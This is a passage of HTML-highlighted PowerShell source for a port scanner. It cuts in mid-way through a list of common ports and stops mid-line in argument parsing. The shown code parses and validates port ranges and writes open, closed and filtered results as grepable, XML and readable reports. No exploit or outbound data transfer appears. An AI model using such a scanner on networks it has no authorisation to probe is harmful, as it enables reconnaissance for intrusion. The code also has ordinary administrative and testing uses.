class="hljs-number">27356</span>,<br>                        <span class="hljs-number">30951</span>,<span class="hljs-number">32783</span>,<span class="hljs-number">32785</span>,<span class="hljs-number">40911</span>,<span class="hljs-number">41511</span>,<span class="hljs-number">44176</span>,<span class="hljs-number">44501</span>,<span class="hljs-number">49161</span>,<span class="hljs-number">49167</span>,<span class="hljs-number">49176</span>,<span class="hljs-number">50300</span>,<span class="hljs-number">50500</span>,<span class="hljs-number">52673</span>,<br>                        <span class="hljs-number">52848</span>,<span class="hljs-number">54045</span>,<span class="hljs-number">54328</span>,<span class="hljs-number">55056</span>,<span class="hljs-number">56737</span>,<span class="hljs-number">57797</span>,<span class="hljs-number">60443</span>,<span class="hljs-number">70</span>,<span class="hljs-number">417</span>,<span class="hljs-number">714</span>,<span class="hljs-number">722</span>,<span class="hljs-number">777</span>,<span class="hljs-number">981</span>,<span class="hljs-number">1009</span>,<span class="hljs-number">2022</span>,<span class="hljs-number">4224</span>,<br>                        <span class="hljs-number">4998</span>,<span class="hljs-number">6346</span>,<span class="hljs-number">301</span>,<span class="hljs-number">524</span>,<span class="hljs-number">668</span>,<span class="hljs-number">765</span>,<span class="hljs-number">2041</span>,<span class="hljs-number">5999</span>,<span class="hljs-number">10082</span>,<span class="hljs-number">259</span>,<span class="hljs-number">1007</span>,<span class="hljs-number">1417</span>,<span class="hljs-number">1434</span>,<span class="hljs-number">1984</span>,<span class="hljs-number">2038</span>,<span class="hljs-number">2068</span>,<span class="hljs-number">4343</span>,<br>                        <span class="hljs-number">6009</span>,<span class="hljs-number">7004</span>,<span class="hljs-number">44443</span>,<span class="hljs-number">109</span>,<span class="hljs-number">687</span>,<span class="hljs-number">726</span>,<span class="hljs-number">911</span>,<span class="hljs-number">1461</span>,<span class="hljs-number">2035</span>,<span class="hljs-number">4125</span>,<span class="hljs-number">6006</span>,<span class="hljs-number">7201</span>,<span class="hljs-number">9103</span>,<span class="hljs-number">125</span>,<span class="hljs-number">481</span>,<span class="hljs-number">683</span>,<span class="hljs-number">903</span>,<br>                        <span class="hljs-number">1011</span>,<span class="hljs-number">1455</span>,<span class="hljs-number">2013</span>,<span class="hljs-number">2043</span>,<span class="hljs-number">2047</span>,<span class="hljs-number">6668</span>,<span class="hljs-number">6669</span>,<span class="hljs-number">256</span>,<span class="hljs-number">406</span>,<span class="hljs-number">843</span>,<span class="hljs-number">2042</span>,<span class="hljs-number">2045</span>,<span class="hljs-number">5998</span>,<span class="hljs-number">9929</span>,<span class="hljs-number">31337</span>,<span class="hljs-number">44442</span>,<br>                        <span class="hljs-number">1092</span>,<span class="hljs-number">1095</span>,<span class="hljs-number">1102</span>,<span class="hljs-number">1105</span>,<span class="hljs-number">1113</span>,<span class="hljs-number">1121</span>,<span class="hljs-number">1123</span>,<span class="hljs-number">1126</span>,<span class="hljs-number">1130</span>,<span class="hljs-number">1132</span>,<span class="hljs-number">1137</span>,<span class="hljs-number">1141</span>,<span class="hljs-number">1145</span>,<span class="hljs-number">1147</span>,<span class="hljs-number">1149</span>,<span class="hljs-number">1154</span>,<br>                        <span class="hljs-number">1164</span>,<span class="hljs-number">1165</span>,<span class="hljs-number">1166</span>,<span class="hljs-number">1174</span>,<span class="hljs-number">1185</span>,<span class="hljs-number">1187</span>,<span class="hljs-number">1192</span>,<span class="hljs-number">1198</span>,<span class="hljs-number">1213</span>,<span class="hljs-number">1216</span>,<span class="hljs-number">1217</span>,<span class="hljs-number">1233</span>,<span class="hljs-number">1236</span>,<span class="hljs-number">1244</span>,<span class="hljs-number">1259</span>,<span class="hljs-number">1277</span>,<br>                        <span class="hljs-number">1287</span>,<span class="hljs-number">1300</span>,<span class="hljs-number">1301</span>,<span class="hljs-number">1309</span>,<span class="hljs-number">1322</span>,<span class="hljs-number">1328</span>,<span class="hljs-number">1556</span>,<span class="hljs-number">1641</span>,<span class="hljs-number">1688</span>,<span class="hljs-number">1719</span>,<span class="hljs-number">1721</span>,<span class="hljs-number">1805</span>,<span class="hljs-number">1812</span>,<span class="hljs-number">1839</span>,<span class="hljs-number">1875</span>,<span class="hljs-number">1914</span>,<br>                        <span class="hljs-number">1971</span>,<span class="hljs-number">1972</span>,<span class="hljs-number">1974</span>,<span class="hljs-number">2099</span>,<span class="hljs-number">2170</span>,<span class="hljs-number">2196</span>,<span class="hljs-number">2200</span>,<span class="hljs-number">2288</span>,<span class="hljs-number">2366</span>,<span class="hljs-number">2382</span>,<span class="hljs-number">2557</span>,<span class="hljs-number">2800</span>,<span class="hljs-number">2910</span>,<span class="hljs-number">2920</span>,<span class="hljs-number">2968</span>,<span class="hljs-number">3007</span>,<br>                        <span class="hljs-number">3013</span>,<span class="hljs-number">3050</span>,<span class="hljs-number">3119</span>,<span class="hljs-number">3304</span>,<span class="hljs-number">3307</span>,<span class="hljs-number">3376</span>,<span class="hljs-number">3400</span>,<span class="hljs-number">3410</span>,<span class="hljs-number">3514</span>,<span class="hljs-number">3684</span>,<span class="hljs-number">3697</span>,<span class="hljs-number">3700</span>,<span class="hljs-number">3824</span>,<span class="hljs-number">3846</span>,<span class="hljs-number">3848</span>,<span class="hljs-number">3859</span>,<br>                        <span class="hljs-number">3863</span>,<span class="hljs-number">3870</span>,<span class="hljs-number">3872</span>,<span class="hljs-number">3888</span>,<span class="hljs-number">3907</span>,<span class="hljs-number">3916</span>,<span class="hljs-number">3931</span>,<span class="hljs-number">3941</span>,<span class="hljs-number">3957</span>,<span class="hljs-number">3963</span>,<span class="hljs-number">3968</span>,<span class="hljs-number">3969</span>,<span class="hljs-number">3972</span>,<span class="hljs-number">3990</span>,<span class="hljs-number">3993</span>,<span class="hljs-number">3994</span>,<br>                        <span class="hljs-number">4009</span>,<span class="hljs-number">4040</span>,<span class="hljs-number">4080</span>,<span class="hljs-number">4096</span>,<span class="hljs-number">4143</span>,<span class="hljs-number">4147</span>,<span class="hljs-number">4200</span>,<span class="hljs-number">4252</span>,<span class="hljs-number">4430</span>,<span class="hljs-number">4555</span>,<span class="hljs-number">4600</span>,<span class="hljs-number">4658</span>,<span class="hljs-number">4875</span>,<span class="hljs-number">4949</span>,<span class="hljs-number">5040</span>,<span class="hljs-number">5063</span>,<br>                        <span class="hljs-number">5074</span>,<span class="hljs-number">5151</span>,<span class="hljs-number">5212</span>,<span class="hljs-number">5223</span>,<span class="hljs-number">5242</span>,<span class="hljs-number">5279</span>,<span class="hljs-number">5339</span>,<span class="hljs-number">5353</span>,<span class="hljs-number">5501</span>,<span class="hljs-number">5807</span>,<span class="hljs-number">5812</span>,<span class="hljs-number">5818</span>,<span class="hljs-number">5823</span>,<span class="hljs-number">5868</span>,<span class="hljs-number">5869</span>,<span class="hljs-number">5899</span>,<br>                        <span class="hljs-number">5905</span>,<span class="hljs-number">5909</span>,<span class="hljs-number">5914</span>,<span class="hljs-number">5918</span>,<span class="hljs-number">5938</span>,<span class="hljs-number">5940</span>,<span class="hljs-number">5968</span>,<span class="hljs-number">5981</span>,<span class="hljs-number">6051</span>,<span class="hljs-number">6060</span>,<span class="hljs-number">6068</span>,<span class="hljs-number">6203</span>,<span class="hljs-number">6247</span>,<span class="hljs-number">6500</span>,<span class="hljs-number">6504</span>,<span class="hljs-number">6520</span>,<br>                        <span class="hljs-number">6550</span>,<span class="hljs-number">6600</span>)<br>            <span class="hljs-variable">$numPorts</span>--<br>            <span class="hljs-variable">$portList</span>.AddRange(<span class="hljs-variable">$topPortList</span>[<span class="hljs-number">0</span><span class="hljs-type">..</span><span class="hljs-variable">$numPorts</span>])<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$pList</span><br>            )<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Ports</span>.Split(<span class="hljs-string">&quot;,&quot;</span>))<br>            &#123;<br><br>                <span class="hljs-comment">#-1 is a special case for ping</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;-1&quot;</span>)<br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br>                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$pRange</span>.Contains(<span class="hljs-string">&quot;-&quot;</span>))<br>                &#123;<br>                    [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$range</span> = <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$range</span>.Count <span class="hljs-operator">-ne</span> <span class="hljs-number">2</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid port range&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$pList</span>.AddRange(<span class="hljs-variable">$range</span>[<span class="hljs-number">0</span>]..<span class="hljs-variable">$range</span>[<span class="hljs-number">1</span>])<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$pList</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span> <span class="hljs-operator">-lt</span> <span class="hljs-literal">-1</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$p</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">65535</span>)<br>                &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$p</span> out of range&quot;</span><br>                &#125;<br>            &#125;<br>         &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-IpPorts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$PortFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$_</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Remove-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$ExcludedPorts</span><br>            )<br><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$ExcludedPorts</span> = <span class="hljs-variable">$ExcludedPorts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-variable">$portList</span>.Remove(<span class="hljs-variable">$x</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Write-PortscanOut</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;Comment&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$comment</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$outhost</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$isUp</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$openPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$closedPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$filteredPorts</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$grepStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.Xml.XmlWriter</span>] <span class="hljs-variable">$xmlStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$readableStream</span><br><br>            )<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$PSCmdlet</span>.ParameterSetName)<br>            &#123;<br>                <span class="hljs-string">&quot;Comment&quot;</span><br>                &#123;<br><br>                    <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-variable">$comment</span><br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                        <span class="hljs-variable">$grepStream</span>.WriteLine(<span class="hljs-string">&quot;# &quot;</span> + <span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteComment(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.WriteLine(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                &#125;<br>                <span class="hljs-string">&quot;HostOut&quot;</span><br>                &#123;<br>                    <span class="hljs-variable">$oPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$openPorts</span>.ToArray())<br>                    <span class="hljs-variable">$cPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$closedPorts</span>.ToArray())<br>                    <span class="hljs-variable">$fPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$filteredPorts</span>.ToArray())<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                       <span class="hljs-comment">#for grepstream use tabs - can be ugly, but easier for regex</span><br>                       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-and</span> !<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Up&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$oPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tOpen Ports: <span class="hljs-variable">$oPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tClosed Ports: <span class="hljs-variable">$cPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tFiltered Ports: <span class="hljs-variable">$fPort</span>&quot;</span>)<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Down&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Host&quot;</span>)<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-variable">$outhost</span>)<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Up&quot;</span>)<br>                             &#125;<br>                             <span class="hljs-keyword">else</span> &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Downs&quot;</span>)<br>                             &#125;<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Ports&quot;</span>)<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$openPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br><br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$closedPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;closed&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$filteredPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;filtered&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Porscan.ps1 scan report for <span class="hljs-variable">$outhost</span>&quot;</span>)<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is up&quot;</span>)<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br><br>                            <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;PORT&quot;</span>, <span class="hljs-string">&quot;STATE&quot;</span>))<br><br>                            [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$allports</span> = <span class="hljs-variable">$openPorts</span> + <span class="hljs-variable">$closedPorts</span> + <span class="hljs-variable">$filteredPorts</span><br>                            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$allports</span>| <span class="hljs-built_in">Sort-Object</span>))<br>                            &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$openPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;open&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$closedPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;closed&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$filteredPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;filtered&quot;</span>))<br>                                &#125;<br>                            &#125;<br><br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span>(!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is Down&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;&quot;</span>)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">#function for Powershell v2.0 to work</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Convert-SwitchtoBool</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$switchValue</span><br>            )<br>            <span class="hljs-keyword">If</span> (<span class="hljs-variable">$switchValue</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br><br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$SkipDiscovery</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$PingOnly</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$quiet</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$quiet</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$ForceOverwrite</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$ForceOverwrite</span>)<br><br>            <span class="hljs-comment">#########</span><br>            <span class="hljs-comment">#parse arguments</span><br>            <span class="hljs-comment">#########</span><br><br>            [<span class="hljs-type">Environment</span>]::CurrentDirectory=(<span class="hljs-built_in">Get-Location</span> <span class="hljs-literal">-PSProvider</span> FileSystem).ProviderPath<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$PsCmdlet</span>.ParameterSetName <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;cmdHosts&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$h</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Hosts</span>)<br>                &#123;<br>                    Parse<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$h</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                Parse<span class="hljs-literal">-ILHosts</span>(<span class="hljs-variable">$HostFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#123;<br>                Exclude<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$Ports</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$PortFile</span>))<br>            &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Cannot set topPorts with other specific ports&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Ports</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$Ports</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$PortFile</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-IpPorts</span>(<span class="hljs-variable">$PortFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$portList</span>.Count <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$TopPorts</span>)<br>                &#123;<br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-variable">$TopPorts</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">#if the ports still aren&#x27;t set, give the deftault, top 50 ports</span><br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-number">50</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-built_in">Remove-Ports</span> <span class="hljs-literal">-ExcludedPorts</span> <span class="hljs-variable">$ExcludedPorts</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$T</span>)<br>            &#123;<br>                <span class="hljs-keyword">switch</span> (<span 